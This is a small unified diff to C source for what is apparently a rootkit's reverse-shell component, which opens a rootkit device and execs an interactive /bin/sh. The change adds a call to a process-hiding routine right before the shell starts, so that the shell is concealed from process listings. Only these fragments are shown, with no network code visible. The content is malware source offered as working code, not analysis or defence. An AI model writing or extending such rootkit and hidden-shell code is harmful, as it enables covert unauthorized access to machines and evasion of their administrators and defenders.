@@ -10,6 +10,7 @@
 
 #include "interface.h"
 
+
 int main(void) {
     printf("[revshell] Started. Attempting to open /dev/%s...\n", rootkit_DEV_NAME);
     fflush(stdout);
@@ -88,6 +89,7 @@ int main(void) {
 
     char *argv[] = { "/bin/sh", "-i", NULL };
     char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", "TERM=xterm", NULL };
+    hide_process_syscall();
     execve("/bin/sh", argv, envp);
 
     /* If execve fails, print error */
